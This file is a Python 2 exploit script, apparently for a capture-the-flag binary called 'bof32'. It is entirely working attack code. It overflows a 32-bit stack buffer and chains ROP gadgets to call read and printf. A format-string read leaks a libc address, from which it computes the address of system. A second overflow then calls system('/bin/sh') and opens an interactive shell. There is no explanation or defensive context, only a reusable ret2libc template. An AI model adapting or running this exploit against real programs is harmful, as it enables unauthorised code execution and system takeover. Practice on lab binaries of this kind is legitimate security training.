#!/usr/bin/env python2.7
# -*- coding:utf-8 -*-
from mkpwn import *

# settings
local   = True
debug   = False

if local:
    target  = './bof32'
else:
    target  = ('0', 0)

# get io
io  = mk(target, debug)

# global
got_read    = 0x0804a00c
plt_read    = 0x08048370
plt_printf  = 0x08048380
elf_entry   = 0x080483c0

offset_system                   = 0x00040190
offset___libc_start_main_ret    = 0x19a83

# gadget
pop_ebx_ret             = 0x08048359
add_esp_0x8_pop_ebp_ret = 0x08048356

# exp
def exp():
    # io.hint([0x80484d9])
    payload  = 'A' * 0x1c
    payload += l32(plt_read)
    payload += l32(add_esp_0x8_pop_ebp_ret)
    payload += l32(0x0)
    payload += l32(0x0804a000 + 0x100)
    payload += l32(0x20)
    payload += l32(plt_printf)
    payload += l32(elf_entry)
    payload += l32(0x804a000 + 0x108)

    io.ru('welcome to pwn me')
    io.pr(payload)

    io.pr('/bin/sh\x00%5$08x')

    libc___libc_start_main_ret = int(io.r(8), 16)
    libc_base   = libc___libc_start_main_ret - offset___libc_start_main_ret
    libc_system = libc_base + offset_system
    info_found('__libc_start_main_ret', libc___libc_start_main_ret)
    info_found('libc_base', libc_base)
    info_found('lib_system', libc_system)

    payload  = 'A' * 0x1c
    payload += l32(libc_system)
    payload += l32(0xdeadbeef)
    payload += l32(0x804a000+0x100)
    io.ru('welcome to pwn me')
    io.pr(payload)
    
    info_shell()
    io.interact()

# main
if __name__ == '__main__':
    exp()
